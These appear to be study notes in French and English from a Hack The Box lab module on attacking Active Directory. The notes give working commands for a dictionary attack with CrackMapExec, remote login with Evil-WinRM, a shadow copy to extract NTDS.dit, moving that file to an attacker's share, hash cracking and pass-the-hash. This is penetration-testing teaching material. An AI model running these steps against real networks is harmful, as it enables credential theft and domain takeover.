# Attacking AD & NTDS



***

Active Directory (AD) est **un service d'annuaire** essentiel et couramment utilisé dans les réseaux d'entreprise modernes.&#x20;

Extraire des identifiants en utilisant une attaque par dictionnaire contre des comptes Active Directory et en récupérant les hachages à partir du fichier **NTDS.dit**.

![AD Authentication](https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png)

Une fois qu'un système Windows rejoint un domaine, il ne s'appuiera plus par défaut sur la base de données **SAM (Security Account Manager)** pour valider les demandes de connexion. Désormais, ce système enverra toutes les requêtes d'authentification au **contrôleur de domaine** (Domain Controller) pour les valider avant d'autoriser un utilisateur à se connecter.

Cela ne signifie pas pour autant que la base de données **SAM** ne peut plus être utilisée. Une personne qui tente de se connecter en utilisant un compte local enregistré dans la base SAM peut toujours le faire en spécifiant le **nom de l'ordinateur** suivi du nom d'utilisateur. Par exemple :

* **WS01/nomutilisateur**
* Ou, dans l'interface de connexion, en utilisant directement `./` avant le nom d'utilisateur pour indiquer une connexion locale.

***

## <mark style="color:red;">Dictionary Attacks against AD accounts using CrackMapExec</mark>

***

**Lorsque nous nous trouvons dans un scénario où une attaque par dictionnaire est une étape envisageable, nous pouvons tirer profit de l'idée de personnaliser notre attaque autant que possible.**

\
Faire cela peut nous permettre d'obtenir les noms des employés qui travaillent dans l'organisation. L'une des premières choses qu'un nouvel employé reçoit est un nom d'utilisateur.

\
De nombreuses organisations suivent une convention de nommage lors de la création des noms d'utilisateur des employés. Voici quelques conventions courantes à considérer :

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Convention de nom d'utilisateur</strong></td><td><strong>Exemple pratique pour Jane Jill Doe</strong></td></tr><tr><td>initialenomdefamille</td><td>jdoe</td></tr><tr><td>initialeprenominitialemilieuprenomnomdefamille</td><td>jjdoe</td></tr><tr><td>prenomnomdefamille</td><td>janedoe</td></tr><tr><td>prenom.nomdefamille</td><td>jane.doe</td></tr><tr><td>nomdefamille.prenom</td><td>doe.jane</td></tr><tr><td>surnom</td><td>doedoehacksstuff</td></tr></tbody></table>

**Souvent, la structure d'une adresse e-mail peut révéler le nom d'utilisateur d'un employé (structure : nomutilisateur@domaine).**\
Par exemple, à partir de l'adresse e-mail `jdoe@inlanefreight.com`, nous voyons que `jdoe` est le nom d'utilisateur.

{% hint style="info" %}
A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.
{% endhint %}

***

#### <mark style="color:orange;">**Création d'une liste personnalisée de noms d'utilisateur**</mark>

**Disons que nous avons fait nos recherches et rassemblé une liste de noms basée sur des informations disponibles publiquement.**

<mark style="color:orange;">**Liste d'exemples de noms :**</mark>

* Ben Williamson

Nous pouvons créer une liste personnalisée sur notre machine d'attaque en utilisant les noms ci-dessus. Nous pouvons utiliser un éditeur de texte en ligne de commande comme Vim ou un éditeur de texte graphique pour créer notre liste. Notre liste pourrait ressembler à ceci :

```
mrroboteLiot@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

**Nous pouvons créer nos listes manuellement ou utiliser un générateur de listes automatisé**, tel que l'outil basé sur Ruby **Username Anarchy**, pour convertir une liste de noms réels en formats de noms d'utilisateur courants.

```
mrroboteLiot@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
ben
benwilliamson
ben.williamson
...
```

**Utiliser des outils automatisés peut nous faire gagner du temps lors de la création des listes.**

***

#### <mark style="color:orange;">**Lancer l'attaque avec CrackMapExec**</mark>

Nous pouvons lancer notre attaque contre le contrôleur de domaine cible à l'aide d'un outil tel que **CrackMapExec**.\
Nous pouvons l'utiliser avec le protocole SMB pour envoyer des requêtes de connexion au contrôleur de domaine cible.

{% code fullWidth="true" %}
```
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
{% endcode %}

Exemple de sortie :

{% code fullWidth="true" %}
```
SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 ...
[-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE
...
[+] inlanefrieght.local\bwilliamson:P@55w0rd!
```
{% endcode %}

**Explication :**

* CrackMapExec utilise SMB pour essayer de se connecter avec le nom d'utilisateur (-u) `bwilliamson` en utilisant une liste de mots de passe (-p) contenant des mots de passe courants.
* Si une politique de verrouillage de compte a été configurée par les administrateurs, cette attaque pourrait verrouiller le compte ciblé.

***

## <mark style="color:red;">**Event Logs from the Attack**</mark>

![Eventlogs from the attack](https://academy.hackthebox.com/storage/modules/147/events_dc.png)

Il peut être utile de savoir ce qu’un attaquant a pu laisser derrière lui. Avoir cette connaissance permet de formuler des recommandations de remédiation plus pertinentes et plus précieuses pour le client avec lequel nous travaillons.

Sur n’importe quel système d’exploitation Windows, un administrateur peut ouvrir l’**Observateur d’événements** et consulter les événements de **sécurité** pour voir précisément quelles actions ont été enregistrées. Cela peut guider les décisions visant à mettre en place des contrôles de sécurité plus stricts et aider dans toute enquête potentielle après une compromission.

Une fois que nous avons découvert certaines informations d’identification, nous pouvons alors tenter d’obtenir un accès à distance au **contrôleur de domaine** cible et de capturer le fichier **NTDS.dit**.

***

## <mark style="color:red;">Capturing NTDS.dit</mark>

* `NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources.&#x20;
* Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).&#x20;
* The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).
* This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's `Attacking SAM` section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

#### <mark style="color:green;">**Connecting to a DC with Evil-WinRM**</mark>

We can connect to a target DC using the credentials we captured.

```shell-session
mrroboteLiot@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

#### <mark style="color:green;">**Checking Local Group Membership**</mark>

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```shell-session
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
```

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

#### <mark style="color:green;">**Checking User Account Privileges including Domain**</mark>

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

#### <mark style="color:green;">**Creating Shadow Copy of C:**</mark>

**We can use `vssadmin` to create a** [**Volume Shadow Copy**](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) **(`VSS`)** of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.&#x20;

We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

<mark style="color:orange;">**Copying NTDS.dit from the VSS**</mark>

We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

{% code overflow="wrap" fullWidth="true" %}
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```
{% endcode %}

<mark style="color:orange;">**Transferring NTDS.dit to Attack Host**</mark>

Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

***

#### <mark style="color:green;">**A Faster Method: Using cme to Capture NTDS.dit**</mark>

Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
{% endcode %}

***

### <mark style="color:red;">Cracking Hashes & Gaining Credentials</mark>

<mark style="color:green;">**Cracking a Single Hash with Hashcat**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```
{% endcode %}

***

### <mark style="color:red;">Pass-the-Hash Considerations</mark>

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

<mark style="color:orange;">**Pass-the-Hash with Evil-WinRM Example**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
{% endcode %}

We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module `AD Enumeration and Attacks`.
